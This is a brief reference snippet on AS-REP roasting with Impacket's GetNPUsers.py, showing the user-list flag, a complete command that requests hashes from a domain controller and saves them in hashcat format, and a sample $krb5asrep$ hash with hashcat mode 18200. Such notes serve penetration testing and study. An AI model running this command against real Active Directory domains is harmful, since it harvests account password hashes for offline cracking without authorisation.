**Command:** `GetNPUsers.py` (Impacket)  
**User-list flag:** `-usersfile`

**Example command line**
```bash
python3 /opt/impacket/examples/GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.5 -format hashcat -outputfile asreproast.txt
```

**Output hash format (AS-REP roast, hashcat mode 18200)**
```
$krb5asrep$23$jsmith@DOMAIN.LOCAL:f5a8b1c2d3e4f5a6b7c8d9e0f1a2b3c4$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
```

The `$krb5asrep$` prefix identifies an AS-REP (no pre-authentication) roastable hash.